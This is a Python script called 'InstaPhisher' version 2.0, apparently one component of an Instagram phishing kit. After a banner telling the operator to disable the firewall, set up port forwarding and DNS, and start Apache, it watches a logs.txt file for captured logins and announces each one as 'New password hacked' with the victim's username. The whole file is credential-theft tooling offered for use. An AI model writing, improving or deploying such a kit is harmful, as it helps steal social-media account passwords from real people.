# ----------------------#
# __Author__  Exilas    #
# __Version__ 2.0       #
# ----------------------#
import time

def menu():
	print(" _____          _       ______ _     _     _\n"
	      "|_   _|        | |      | ___ \ |   (_)   | |              \n"
	      "  | | _ __  ___| |_ __ _| |_/ / |__  _ ___| |__   ___ _ __ \n"
	      "  | || '_ \/ __| __/ _` |  __/| '_ \| / __| '_ \ / _ \ '__|\n"
	      " _| || | | \__ \ || (_| | |   | | | | \__ \ | | |  __/ |\n"
	      " \___/_| |_|___/\__\__,_\_|   |_| |_|_|___/_| |_|\___|_|\n")
	print('----------------------------------------------------------')
	print('[i] Make sure you have disabled your firewall')
	print('[i] Make sure you have make port forwarding')
	print('[i] Make sure you have configured your DNS')
	print('[i] Make sure you have started apache')
	print('\nExilas // InstaPhisher // Version 2.0')
	print('----------------------------------------------------------')


def exist(file):
	try:
		with open(file): pass

	except IOError:
		return 0

	else:
		return 1


def beep():
	print('\a')


def main():

	menu()
	print('\nListner start ...\n')
	nbLine = 0

	if exist('logs.txt') == 0:
		with open('logs.txt', 'a') as logs:
			logs.write('')

	with open('logs.txt', 'r') as logs:
		lines = logs.readlines()

	for line in lines:
		nbLine += 1

	while 1:

		time.sleep(1)
		nbLine2 = 0

		with open('logs.txt', 'r') as logs:
			lines = logs.readlines()

		for line in lines:
			nbLine2 += 1

		if nbLine != nbLine2:
			nbLine = nbLine2
			usernameLine = nbLine - 5

			i = 0
			for line in lines:
				i += 1

				if i == usernameLine:
					username = line.split(': ')

			print('[+] New password hacked - '+str(username[1]))
			beep()

if __name__ == '__main__':
    main()
